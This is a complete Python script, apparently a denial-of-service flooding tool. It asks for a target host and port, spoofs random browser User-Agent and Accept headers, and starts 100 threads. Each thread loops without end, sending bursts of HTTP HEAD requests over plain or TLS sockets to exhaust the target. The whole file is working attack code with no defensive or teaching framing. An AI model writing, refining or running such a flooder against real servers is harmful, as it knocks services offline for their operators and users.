import socket
import ssl
import threading
import random
import datetime

ip = str(input("HOST/IP: "))
port = int(input("PORT: "))

Choice = random.choice
Intn = random.randint

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

def getuseragent():
	platform = Choice(['Macintosh', 'Windows', 'X11'])
	if platform == 'Macintosh':
		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
	elif platform == 'Windows':
		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
	elif platform == 'X11':
		os  = Choice(['Linux i686', 'Linux x86_64'])
	browser = Choice(['chrome', 'firefox', 'ie'])
	if browser == 'chrome':
		webkit = str(Intn(500, 599))
		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
	elif browser == 'firefox':
		currentYear = datetime.date.today().year
		year = str(Intn(2020, currentYear))
		month = Intn(1, 12)
		if month < 10:
			month = '0' + str(month)
		else:
			month = str(month)
		day = Intn(1, 30)
		if day < 10:
			day = '0' + str(day)
		else:
			day = str(day)
		gecko = year + month + day
		version = str(Intn(1, 72)) + '.0'
		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
	elif browser == 'ie':
		version = str(Intn(1, 99)) + '.0'
		engine = str(Intn(1, 99)) + '.0'
		option = Choice([True, False])
		if option == True:
			token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
		else:
			token = ''
		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

#headers
get_host = "HEAD / HTTP/1.1\r\nHost: " + ip + ":" + str(port) + "\r\n"
connection = "Connection: keep-alive\r\n"
useragent = "User-Agent: " + getuseragent() + "\r\n"
accept = Choice(acceptall)

def requests():
    while True:
        if port == 443:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            context = ssl.create_default_context()
            ssl_sock = context.wrap_socket(s, server_hostname=ip)
            ssl_sock.connect((ip, port))
            request = get_host + connection + useragent + accept + "\r\n"
            for ssl_ in range(100):
                ssl_sock.sendall(request.encode())
            ssl_sock.close()
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            request = get_host + connection + useragent + accept + "\r\n"
            for s_ in range(100):
                s.sendall(request.encode())
            s.close()

for y in range(100):
    th = threading.Thread (target=requests)
    th.start()
